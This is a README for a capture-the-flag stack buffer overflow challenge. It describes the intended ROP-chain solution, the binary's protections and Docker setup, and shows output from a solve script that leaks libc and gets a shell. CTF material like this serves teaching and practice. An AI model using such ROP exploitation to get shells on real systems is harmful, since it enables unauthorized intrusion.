# Chall 12 (Episode 7a - Speedrun Edition)

## Challenge

A standard stack based buffer overflow challenge on a x86_64 binary. The intended method
for solving is to build a ROP chain in order to leak and read in a second payload in order
to run something.

## Protections

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## Building / Running
```bash
$ cd deploy
$ docker build -t chall12 .
$ docker run -d -p 11536:1337/tcp chall12:latest
```

## Testing Exploit

By default the host and port are set to `challenge.pwny.racing` and `11536`. These can be
overwritten by providing arguments to the `solve.py` script.

```bash
$ cd solve
$ ./solve.py localhost 11536
...
[*] leak: 0x7f1425cfbe80
[*] libc: 0x7f1425c97000
[+] shell? uid=999(ctf) gid=999(ctf) groups=999(ctf)
[*] Switching to interactive mode
$ ls -al
total 6964
drwxr-xr-x 1 root ctf     4096 Aug 18 13:55 .
drwxr-xr-x 1 root root    4096 Aug 18 13:55 ..
-r-------- 1 root ctf      107 Aug 18 13:52 .config.json
-rwxr-x--- 1 root ctf    10288 Aug 18 13:43 chall
---s--x--x 1 root ctf  7100702 Jul 25 16:28 flag_submitter
-rwxr-x--- 1 root ctf       36 Jul 26 03:41 redir.sh
```